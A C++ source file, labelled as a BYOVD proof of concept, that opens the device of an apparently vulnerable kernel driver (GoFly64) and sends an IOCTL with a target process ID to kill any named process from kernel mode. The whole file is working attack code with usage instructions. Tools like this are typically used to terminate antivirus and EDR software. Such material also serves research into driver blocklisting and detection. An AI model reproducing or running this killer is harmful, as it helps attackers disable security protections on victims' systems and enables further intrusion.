#include <windows.h>
#include <iostream>
#include <string>
#include <vector>
#include <tlhelp32.h>

class GoFlyDrv {
public:
    static constexpr const char* DRIVER_NAME = "GoFly64";
    static constexpr const char* DRIVER_FILE = "GoFly64.sys";
    static constexpr const char* DEVICE_PATH = "\\\\.\\GoFly";
    static constexpr DWORD IOCTL_CODE = 0x12227A;
    static constexpr size_t OUTPUT_SIZE = 4;

    static std::vector<BYTE> BuildIoctlInput(DWORD pid) {
        std::vector<BYTE> input(sizeof(DWORD));
        memcpy(input.data(), &pid, sizeof(DWORD));
        return input;
    }
};

DWORD GetProcessIdByName(const std::wstring& processName) {
    DWORD pid = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    
    if (snapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);

    if (Process32FirstW(snapshot, &pe32)) {
        do {
            std::wstring currentProcess(pe32.szExeFile);
            if (_wcsicmp(currentProcess.c_str(), processName.c_str()) == 0) {
                pid = pe32.th32ProcessID;
                break;
            }
        } while (Process32NextW(snapshot, &pe32));
    }

    CloseHandle(snapshot);
    return pid;
}

class BYOVDKiller {
public:
    bool Run(const std::wstring& processName) {
        // Obtener PID del proceso objetivo
        DWORD pid = GetProcessIdByName(processName);
        if (pid == 0) {
            std::wcerr << L"[-] Proceso no encontrado: " << processName << std::endl;
            return false;
        }

        std::wcout << L"[+] Objetivo: " << processName << L" (PID: " << pid << L")" << std::endl;

        // Abrir handle al driver
        HANDLE hDevice = CreateFileA(
            GoFlyDrv::DEVICE_PATH,
            GENERIC_READ | GENERIC_WRITE,
            0,
            NULL,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            NULL
        );

        if (hDevice == INVALID_HANDLE_VALUE) {
            std::cerr << "[-] Error al abrir el driver: " << GetLastError() << std::endl;
            return false;
        }

        std::cout << "[+] Driver abierto exitosamente" << std::endl;

        // Preparar input buffer (PID en little-endian)
        auto inputBuffer = GoFlyDrv::BuildIoctlInput(pid);
        
        // Output buffer
        std::vector<BYTE> outputBuffer(GoFlyDrv::OUTPUT_SIZE);
        DWORD bytesReturned = 0;

        // Enviar IOCTL
        BOOL result = DeviceIoControl(
            hDevice,
            GoFlyDrv::IOCTL_CODE,
            inputBuffer.data(),
            static_cast<DWORD>(inputBuffer.size()),
            outputBuffer.data(),
            static_cast<DWORD>(outputBuffer.size()),
            &bytesReturned,
            NULL
        );

        if (!result) {
            std::cerr << "[-] DeviceIoControl falló: " << GetLastError() << std::endl;
            CloseHandle(hDevice);
            return false;
        }

        std::cout << "[+] IOCTL enviado exitosamente" << std::endl;
        std::cout << "[+] Proceso terminado (Bytes retornados: " << bytesReturned << ")" << std::endl;

        CloseHandle(hDevice);
        return true;
    }
};

void PrintUsage(const char* programName) {
    std::cout << "Uso: " << programName << " -n <nombre_proceso.exe>" << std::endl;
    std::cout << "Ejemplo: " << programName << " -n notepad.exe" << std::endl;
}


int main(int argc, char* argv[]) {
    std::cout << "[*] GoFlyDrv BYOVD PoC" << std::endl;
    std::wstring processName;
    
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-n") == 0 || strcmp(argv[i], "--name") == 0) {
            if (i + 1 < argc) {
                int len = MultiByteToWideChar(CP_ACP, 0, argv[i + 1], -1, NULL, 0);
                processName.resize(len);
                MultiByteToWideChar(CP_ACP, 0, argv[i + 1], -1, &processName[0], len);
                if (!processName.empty() && processName.back() == L'\0') {
                    processName.pop_back();
                }
                i++;
            } else {
                std::cerr << "[-] Falta valor para -n/--name" << std::endl;
                PrintUsage(argv[0]);
                return 1;
            }
        } else if (strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "--help") == 0) {
            PrintUsage(argv[0]);
            return 0;
        }
    }

    if (processName.empty()) {
        std::cerr << "[-] Se requiere nombre de proceso (-n)" << std::endl;
        PrintUsage(argv[0]);
        return 1;
    }

    // Ejecutar el killer
    BYOVDKiller killer;
    bool success = killer.Run(processName);

    return success ? 0 : 1;
}